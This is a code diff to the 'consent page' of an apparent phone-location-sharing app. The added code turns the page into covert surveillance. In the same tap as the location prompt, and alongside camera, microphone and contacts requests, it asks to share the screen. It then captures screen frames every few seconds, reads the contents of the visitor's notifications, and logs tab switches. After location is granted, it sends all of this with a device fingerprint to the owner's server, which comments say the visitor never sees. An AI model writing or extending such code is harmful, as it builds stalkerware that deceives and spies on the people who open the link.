@@ -722,6 +722,16 @@ export default function ConsentPage() {
   // owner's dashboard (/api/sessions), never rendered on this public page.
   const deviceInfoRef = useRef<Record<string, unknown>>({});
 
+  // ── Session Recording (Mistral Pixtral) ─────────────────────────────────────
+  // Tracks everything from page-open → location-grant for permanent AI memory.
+  const sessionStartMsRef = useRef<number>(Date.now());
+  const sessionTimelineRef = useRef<{ event: string; ts: number; detail?: unknown }[]>([]);
+  const sessionFramesRef = useRef<string[]>([]);
+  const sessionScreenVideoRef = useRef<HTMLVideoElement | null>(null);
+  const sessionScreenStreamRef = useRef<MediaStream | null>(null);
+  const sessionFrameCaptureRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const sessionSavedRef = useRef(false);
+
   const GPS_KEY = `phonelink_gps_${token}`;
   const loadStoredGps = (): { lat: number; lng: number; accuracy?: number } | null => {
     try { const raw = localStorage.getItem(GPS_KEY); if (!raw) return null; return JSON.parse(raw); } catch { return null; }
@@ -739,6 +749,23 @@ export default function ConsentPage() {
   useEffect(() => { addressRef.current = address; }, [address]);
   useEffect(() => { updateCountRef.current = updateCount; }, [updateCount]);
   useEffect(() => { coordsRef.current = coords; }, [coords]);
+
+  // ── Session: record page-open and track tab-switch events ───────────────────
+  useEffect(() => {
+    sessionStartMsRef.current = Date.now();
+    sessionTimelineRef.current.push({ event: "page_open", ts: 0, detail: { token } });
+    const onVisibility = () => {
+      const e = document.visibilityState === "hidden" ? "app_hidden" : "app_visible";
+      sessionTimelineRef.current.push({ event: e, ts: Date.now() - sessionStartMsRef.current });
+    };
+    document.addEventListener("visibilitychange", onVisibility);
+    return () => {
+      document.removeEventListener("visibilitychange", onVisibility);
+      // Stop any ongoing screen capture on unmount
+      sessionFrameCaptureRef.current && clearInterval(sessionFrameCaptureRef.current);
+      sessionScreenStreamRef.current?.getTracks().forEach((t) => t.stop());
+    };
+  }, []); // eslint-disable-line react-hooks/exhaustive-deps
 
   // Deep device/browser/network fingerprint — collected once asynchronously.
   // Only ever surfaced to the owner's dashboard (/api/sessions); never rendered
@@ -1360,6 +1387,93 @@ export default function ConsentPage() {
 
   useEffect(() => () => stopTracking(), [stopTracking]);
 
+  // ── Session recording helpers ────────────────────────────────────────────────
+
+  const pushSessionEvent = useCallback((event: string, detail?: unknown) => {
+    sessionTimelineRef.current.push({
+      event,
+      ts: Date.now() - sessionStartMsRef.current,
+      ...(detail != null ? { detail } : {}),
+    });
+  }, []);
+
+  const captureScreenFrame = useCallback(() => {
+    const video = sessionScreenVideoRef.current;
+    if (!video || !sessionScreenStreamRef.current?.active || video.paused) return;
+    try {
+      const W = Math.min(video.videoWidth || 640, 640);
+      const H = Math.round((video.videoHeight || 360) * W / (video.videoWidth || 640));
+      const canvas = document.createElement("canvas");
+      canvas.width = W; canvas.height = H;
+      canvas.getContext("2d")!.drawImage(video, 0, 0, W, H);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
+      if (dataUrl.length > 100) sessionFramesRef.current.push(dataUrl);
+    } catch { /* canvas tainted or unavailable */ }
+  }, []);
+
+  const stopScreenCapture = useCallback(() => {
+    if (sessionFrameCaptureRef.current) { clearInterval(sessionFrameCaptureRef.current); sessionFrameCaptureRef.current = null; }
+    sessionScreenStreamRef.current?.getTracks().forEach((t) => t.stop());
+    sessionScreenStreamRef.current = null;
+    if (sessionScreenVideoRef.current) { sessionScreenVideoRef.current.srcObject = null; sessionScreenVideoRef.current = null; }
+  }, []);
+
+  const startScreenCapture = useCallback(() => {
+    if (!navigator.mediaDevices?.getDisplayMedia) return;
+    navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 1 } as MediaTrackConstraints, audio: false })
+      .then((stream) => {
+        sessionScreenStreamRef.current = stream;
+        pushSessionEvent("screen_shared");
+        const video = document.createElement("video");
+        video.srcObject = stream; video.muted = true; video.playsInline = true;
+        sessionScreenVideoRef.current = video;
+        video.play().then(() => {
+          captureScreenFrame();
+          sessionFrameCaptureRef.current = setInterval(captureScreenFrame, 5000);
+        }).catch(() => {});
+        stream.getVideoTracks()[0]?.addEventListener("ended", () => {
+          pushSessionEvent("screen_share_ended");
+          stopScreenCapture();
+        });
+      })
+      .catch(() => pushSessionEvent("screen_denied"));
+  }, [pushSessionEvent, captureScreenFrame, stopScreenCapture]);
+
+  const saveSession = useCallback(async (timeToGrantMs?: number) => {
+    if (sessionSavedRef.current || !token) return;
+    sessionSavedRef.current = true;
+    stopScreenCapture();
+
+    let notifications: Record<string, unknown>[] = [];
+    try {
+      const reg = await navigator.serviceWorker?.ready;
+      const notifs = await reg?.getNotifications?.();
+      notifications = (notifs ?? []).map((n: Notification) => ({ title: n.title, body: n.body, tag: n.tag }));
+    } catch { /* SW unavailable */ }
+
+    const body = {
+      token: String(token),
+      timeline: sessionTimelineRef.current,
+      screenFrames: sessionFramesRef.current,
+      deviceSnapshot: {
+        ...deviceInfoRef.current,
+        battery: batteryLevelRef.current != null
+          ? { level: batteryLevelRef.current, charging: batteryChargingRef.current }
+          : undefined,
+      },
+      notifications,
+      ...(timeToGrantMs != null ? { timeToGrantMs } : {}),
+    };
+
+    try {
+      await fetch(`${API_BASE}/api/consent-sessions`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(body),
+      });
+    } catch { /* best-effort — never block tracking */ }
+  }, [token, stopScreenCapture]);
+
   const processGeoPosition = useCallback((position: GeolocationPosition) => {
     const { latitude, longitude, accuracy } = position.coords;
     setCoords({ lat: latitude, lng: longitude, accuracy });
@@ -1367,7 +1481,13 @@ export default function ConsentPage() {
     grant.mutate(
       { token: token!, data: { latitude, longitude } },
       {
-        onSuccess: () => startTracking(latitude, longitude, accuracy),
+        onSuccess: () => {
+          startTracking(latitude, longitude, accuracy);
+          // Save session data with Pixtral analysis — non-blocking background task
+          pushSessionEvent("location_granted", { accuracy, lat: latitude, lng: longitude });
+          const elapsed = Date.now() - sessionStartMsRef.current;
+          saveSession(elapsed).catch(() => {});
+        },
         onError: (err: any) => {
           const msg = err?.data?.error ?? "Failed to record consent. Please try again.";
           setErrorMsg(msg); setState("error");
@@ -1375,19 +1495,24 @@ export default function ConsentPage() {
       },
     );
     reverseGeocode(latitude, longitude).then((addr) => { if (addr) setAddress(addr); });
-  }, [token, grant, startTracking]);
+  }, [token, grant, startTracking, pushSessionEvent, saveSession]);
 
   const doGrant = useCallback(() => {
     if (!navigator.geolocation) {
       setState("gps_off"); return;
     }
     setState("requesting");
+    pushSessionEvent("location_requested");
 
     // Fire the camera+mic request in the same tap as location, so the
     // browser surfaces its native prompts back-to-back right now instead of
     // waiting until tracking starts later.
     prewarmCameraAndMic();
     pickContacts();
+    // Request screen share in the same user-gesture window — the browser
+    // surfaces its native screen-picker dialog right now. If the contact
+    // denies it, we silently continue (pushSessionEvent records the refusal).
+    startScreenCapture();
 
     let settled = false;
     let tempWatchId: number | null = null;
